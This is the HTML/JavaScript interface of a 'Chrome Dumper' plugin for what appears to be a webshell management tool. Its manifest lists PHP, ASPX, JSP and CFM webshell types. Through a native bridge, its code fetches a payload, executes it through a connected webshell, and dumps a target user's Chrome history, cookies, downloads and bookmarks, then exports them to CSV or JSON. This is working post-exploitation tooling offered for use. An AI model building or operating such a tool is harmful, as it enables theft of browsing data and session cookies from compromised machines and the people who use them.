<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>Chrome Dumper</title>
    <style>
        :root {
            --win-bg: #121212;
            --win-surface: #1a1a1a;
            --win-surface-alt: #242424;
            --win-border: #333333;
            --win-border-dark: #444444;
            --win-gray-text: #999999;
            --win-light-text: #e0e0e0;
            --win-highlight: #0078d4;
            --win-highlight-text: #ffffff;
            --win-hover: #2a2a2a;
        }

        html, body {
            height: 100%;
            margin: 0;
            padding: 6px;
            background-color: var(--win-bg);
            color: var(--win-light-text);
            font-family: "Segoe UI", Tahoma, Arial, sans-serif;
            font-size: 12px;
            box-sizing: border-box;
            overflow: hidden;
            user-select: none;
        }

        .win-window {
            display: flex;
            flex-direction: column;
            height: 100%;
            border: 1px solid var(--win-border-dark);
            background: var(--win-surface);
            box-shadow: 0 4px 16px rgba(0,0,0,0.8);
            border-radius: 4px;
            overflow: hidden;
        }

        .win-titlebar {
            background: #181818;
            color: var(--win-light-text);
            padding: 8px 12px;
            font-weight: 600;
            font-size: 13px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--win-border);
        }

        .win-body {
            padding: 10px;
            display: flex;
            flex-direction: column;
            flex: 1;
            gap: 8px;
            overflow: hidden;
            background-color: var(--win-bg);
        }

        fieldset {
            border: 1px solid var(--win-border);
            background: var(--win-surface);
            margin: 0 0 4px 0;
            padding: 8px 12px;
            border-radius: 4px;
        }
        legend {
            color: #4cc2ff;
            font-weight: 600;
            background: var(--win-surface);
            padding: 0 4px;
        }

        .form-row {
            display: flex;
            gap: 10px;
            margin-bottom: 6px;
            align-items: center;
        }
        .form-row:last-child {
            margin-bottom: 0;
        }
        .form-group {
            flex: 1;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        label {
            min-width: 90px;
            text-align: right;
            color: var(--win-gray-text);
        }

        input[type="text"], select {
            flex: 1;
            background: #111111;
            color: var(--win-light-text);
            border: 1px solid var(--win-border-dark);
            padding: 4px 8px;
            font-family: "Segoe UI", Tahoma, Arial, sans-serif;
            font-size: 12px;
            border-radius: 3px;
        }
        input:focus, select:focus {
            outline: 2px solid var(--win-highlight);
            border-color: transparent;
        }

        .btn-row {
            display: flex;
            justify-content: flex-end;
            gap: 6px;
        }
        button {
            background-color: #262626;
            color: var(--win-light-text);
            border: 1px solid var(--win-border-dark);
            padding: 4px 14px;
            font-family: "Segoe UI", Tahoma, Arial, sans-serif;
            font-size: 12px;
            cursor: pointer;
            min-width: 80px;
            border-radius: 3px;
            transition: background 0.1s;
        }
        button:hover:not(:disabled) {
            background-color: #333333;
            border-color: #666;
        }
        button:active:not(:disabled) {
            background-color: #1f1f1f;
        }
        button:disabled {
            color: #555;
            background-color: #181818;
            border-color: var(--win-border);
            cursor: default;
        }

        .workspace {
            display: flex;
            flex: 1;
            flex-direction: column;
            overflow: hidden;
            border: 1px solid var(--win-border);
            background: var(--win-surface);
            border-radius: 4px;
            padding: 8px;
            gap: 6px;
        }

        .toolbar {
            display: flex;
            gap: 8px;
            align-items: center;
            justify-content: space-between;
        }
        .search-container {
            flex: 1;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .export-container {
            display: flex;
            gap: 6px;
        }

        .output-box {
            flex: 1;
            border: 1px solid var(--win-border);
            background: #0d0d0d;
            color: #4ec9b0;
            font-family: "Cascadia Code", Consolas, monospace;
            font-size: 11px;
            padding: 8px;
            overflow: auto;
            border-radius: 3px;
            box-sizing: border-box;
        }

        .output-table {
            width: 100%;
            table-layout: fixed;
            border-collapse: collapse;
            text-align: left;
            font-size: 11px;
        }
        .output-table th, .output-table td {
            padding: 6px 8px;
            border-bottom: 1px solid var(--win-border);
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .output-table th {
            background-color: var(--win-surface-alt);
            color: #4cc2ff;
            position: sticky;
            top: 0;
            z-index: 1;
        }
        .output-table tr:hover {
            background-color: var(--win-hover);
        }

        .console-box {
            height: 60px;
            border: 1px solid var(--win-border);
            background: #0d0d0d;
            color: #9cdcfe;
            font-family: "Cascadia Code", Consolas, monospace;
            font-size: 11px;
            padding: 6px;
            overflow-y: auto;
            white-space: pre-wrap;
            border-radius: 4px;
        }

        .status-bar {
            background: var(--win-surface);
            border-top: 1px solid var(--win-border);
            padding: 4px 10px;
            font-size: 11px;
            display: flex;
            justify-content: space-between;
            color: var(--win-gray-text);
        }
    </style>
</head>
<body>

<div class="win-window">
    <div class="win-titlebar">
        <span>Chrome Dumper</span>
        <span id="sysStatusBadge" style="font-size:11px; background:#a80000; color:white; padding:2px 8px; border-radius:10px; font-weight:normal;">DISCONNECTED</span>
    </div>

    <div class="win-body">
        <fieldset>
            <legend>Target Profile Configuration</legend>
            <div class="form-row">
                <div class="form-group">
                    <label>Target User:</label>
                    <input type="text" id="txtUsername" value="%USERNAME%">
                </div>
                <div class="form-group" style="max-width: 220px;">
                    <label style="min-width: 60px;">Profile:</label>
                    <select id="selProfile">
                        <option value="Default">Default</option>
                        <option value="Profile 1">Profile 1</option>
                        <option value="Profile 2">Profile 2</option>
                    </select>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Action Type:</label>
                    <select id="selAction">
                        <option value="history">Dump History Database</option>
                        <option value="cookie">Dump Cookies Database</option>
                        <option value="download">Dump Download Database</option>
                        <option value="bookmark">Dump Bookmarks</option>
                    </select>
                </div>
                <div style="min-width: 220px;" class="btn-row">
                    <button id="btnExecute" onclick="runDumper()" disabled style="background-color: #005a9e;">Execute Dump</button>
                    <button onclick="clearOutput()">Clear</button>
                </div>
            </div>
        </fieldset>

        <div class="workspace">
            <div class="toolbar">
                <div class="search-container">
                    <label style="min-width: 50px; text-align: left;">Filter:</label>
                    <input type="text" id="searchBox" placeholder="Type to search in current records..." oninput="filterTable()">
                </div>
                <div class="export-container">
                    <button onclick="exportData('csv')" id="btnExportCSV" disabled>Export CSV</button>
                    <button onclick="exportData('json')" id="btnExportJSON" disabled>Export JSON</button>
                </div>
            </div>

            <div class="output-box" id="outputResult"></div>
        </div>

        <div class="console-box" id="consoleOutput"></div>
    </div>

    <div class="status-bar">
        <span id="statusBarText">Status: Disconnected</span>
        <span>Alien Plugin</span>
    </div>
</div>

<script>
    const pluginManifest = {
        "supportedLangs": [
            "ASP/Classic/OneShell",
            "PHP/v5.X/OneShell",
            "PHP/v7.X/OneShell",
            "PHP/v8.X/OneShell",
            "ASPX/JScript/OneShell",
            "ASPX/NebulaPulsar/DarkMatter",
            "ASHX/JScript/OneShell",
            "ASHX/NebulaPulsar/DarkMatter",
            "ASMX/JScript/OneShell",
            "ASMX/NebulaPulsar/DarkMatter",
            "JSP/Nashorn/OneShell",
            "JSPX/Nashorn/OneShell",
            "JSP/NebulaPulsar/DarkMatter",
            "JSPX/NebulaPulsar/DarkMatter",
            "CFM/NebulaPulsar/DarkMatter",
        ]
    };

    let currentShellType = "";
    let globalDataCache = [];

    function appendLog(text) {
        const consoleBox = document.getElementById('consoleOutput');
        if (!text) return;
        consoleBox.innerText += text + "\r\n";
        consoleBox.scrollTop = consoleBox.scrollHeight;
    }

    function formatToUTC(val) {
        if (val === null || val === undefined || val === '') return '';
        
        let num = Number(val);
        if (!isNaN(num) && num > 100000000000) {
            let jsTimestamp = Math.floor(num / 1000) - 11644473600000;
            let d = new Date(jsTimestamp);
            if (!isNaN(d.getTime()) && d.getUTCFullYear() > 1970) {
                return d.toISOString().replace('T', ' ').substring(0, 19) + " UTC";
            }
        }
        
        if (!isNaN(num) && num > 1000000000) {
            let d = new Date(num.toString().length === 10 ? num * 1000 : num);
            if (!isNaN(d.getTime()) && d.getUTCFullYear() > 1970) {
                return d.toISOString().replace('T', ' ').substring(0, 19) + " UTC";
            }
        }

        return String(val);
    }

    function renderTable(dataArray) {
        globalDataCache = dataArray || [];
        const outBox = document.getElementById('outputResult');
        
        document.getElementById('btnExportCSV').disabled = globalDataCache.length === 0;
        document.getElementById('btnExportJSON').disabled = globalDataCache.length === 0;

        if (!dataArray || dataArray.length === 0) {
            outBox.innerHTML = '<div style="padding: 10px; color: #999;">[-] No records found.</div>';
            return;
        }

        buildTableHTML(dataArray);
    }

    function buildTableHTML(dataArray) {
        const outBox = document.getElementById('outputResult');
        if (dataArray.length === 0) {
            outBox.innerHTML = '<div style="padding: 10px; color: #999;">[-] No matching records found.</div>';
            return;
        }

        let html = '<table class="output-table"><thead><tr>';
        const headers = Object.keys(dataArray[0]);
        
        headers.forEach(h => {
            html += `<th>${h}</th>`;
        });
        html += '</tr></thead><tbody>';

        dataArray.forEach(row => {
            html += '<tr>';
            headers.forEach(h => {
                let rawVal = row[h];
                let displayVal = rawVal;
                
                if (/time|date|used/i.test(h)) {
                    displayVal = formatToUTC(rawVal);
                } else if (rawVal !== null && rawVal !== undefined) {
                    displayVal = String(rawVal);
                } else {
                    displayVal = '';
                }

                html += `<td title="${escapeHtml(displayVal)}">${escapeHtml(displayVal)}</td>`;
            });
            html += '</tr>';
        });

        html += '</tbody></table>';
        outBox.innerHTML = html;
    }

    function filterTable() {
        const query = document.getElementById('searchBox').value.toLowerCase();
        if (!globalDataCache || globalDataCache.length === 0) return;

        if (!query) {
            buildTableHTML(globalDataCache);
            return;
        }

        const filtered = globalDataCache.filter(row => {
            return Object.values(row).some(val => {
                if (val === null || val === undefined) return false;
                return String(val).toLowerCase().includes(query);
            });
        });

        buildTableHTML(filtered);
    }

    // export data
    function exportData(type) {
        if (!globalDataCache || globalDataCache.length === 0)
            return;

        const bridge = window.chrome.webview.hostObjects.nativeBridge;

        let content = "";
        let filename = `chrome_dump_${document.getElementById('selAction').value}_${Date.now()}`;

        if (type === 'json') {
            // JSON file
            content = JSON.stringify(globalDataCache, null, 2);
            filename += '.json';
        } else if (type === 'csv') {
            // CSV file
            const headers = Object.keys(globalDataCache[0]);
            let csvRows = [];
            csvRows.push(headers.join(','));

            globalDataCache.forEach(row => {
                let values = headers.map(h => {
                    let val = row[h] !== null && row[h] !== undefined ? String(row[h]) : '';
                    val = val.replace(/"/g, '""');
                    return `"${val}"`;
                });
                csvRows.push(values.join(','));
            });

            content = csvRows.join('\r\n');
            filename += '.csv';
        }

        let result = bridge.fnSaveFileText(filename, content);
        appendLog(result);
    }

    function escapeHtml(str) {
        return str.replace(/&/g, "&amp;")
                  .replace(/</g, "&lt;")
                  .replace(/>/g, "&gt;")
                  .replace(/"/g, "&quot;")
                  .replace(/'/g, "&#039;");
    }

    function clearOutput() {
        globalDataCache = [];
        document.getElementById('searchBox').value = '';
        document.getElementById('btnExportCSV').disabled = true;
        document.getElementById('btnExportJSON').disabled = true;
        document.getElementById('outputResult').innerHTML = '[*] Ready.';
    }

    window.addEventListener('DOMContentLoaded', async () => {
        const statusBarText = document.getElementById('statusBarText');
        const btnExecute = document.getElementById('btnExecute');
        const badge = document.getElementById('sysStatusBadge');

        appendLog("[*] Ready to extract browser artifacts. Select an action and click Execute.");
        appendLog("[*] Chrome Dumper UI initialized. Awaiting bridge connection.");

        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                currentShellType = await bridge.fnGetShellType();

                if (pluginManifest.supportedLangs.includes(currentShellType)) {
                    statusBarText.innerText = `Bridge Connected: ${currentShellType}`;
                    badge.innerText = "READY";
                    badge.style.background = "#107c10";
                    btnExecute.disabled = false;
                    appendLog("[*] WebView2 bridge connected successfully.");
                } else {
                    badge.innerText = "INCOMPATIBLE";
                    badge.style.background = "#a80000";
                    appendLog("[-] Incompatible shell type: " + currentShellType);
                }
            } else {
                btnExecute.disabled = false;
                appendLog("[*] Running in standalone/debug mode (no native bridge).");
            }
        } catch (e) {
            appendLog("[!] Bridge error: " + e.message);
        }
    });

    async function runDumper() {
        const action = document.getElementById('selAction').value;
        const targetUser = document.getElementById('txtUsername').value;
        const profile = document.getElementById('selProfile').value;

        document.getElementById('searchBox').value = '';

        appendLog(`[*] Executing action [${action}] for profile [${profile}]...`);

        const configParams = {
            action: action,
            profile: profile
        };

        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1).replace("/", "\\");
                
                const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
                let rawResult = await bridge.fnRun(JSON.stringify(configParams), payloadCode, currentShellType);
                
                try {
                    const jsonStartIndex = rawResult.indexOf('{');
                    if (jsonStartIndex !== -1) {
                        const jsonStr = rawResult.substring(jsonStartIndex);
                        const resObj = JSON.parse(jsonStr);
                        
                        if (resObj.status === 'success') {
                            renderTable(resObj.data);
                            appendLog(`[+] Loaded ${resObj.data.length} records for [${action}]`);
                        } else {
                            document.getElementById('outputResult').innerText = rawResult;
                            appendLog(`[-] Dump failed: ${rawResult}`);
                        }
                    } else {
                        document.getElementById('outputResult').innerText = rawResult;
                        appendLog(`[-] Non-JSON response received.`);
                    }
                } catch (parseErr) {
                    document.getElementById('outputResult').innerText = rawResult;
                    appendLog(`[-] Parse Error: ${parseErr.message}`);
                }
            } else {
                appendLog("[-] Failed to bridge webview.");
            }
        } catch (e) {
            appendLog("[-] Bridge Execution Error: " + e.message);
            document.getElementById('outputResult').innerText = "[-] Error: " + e.message;
        }
    }
</script>

</body>
</html>
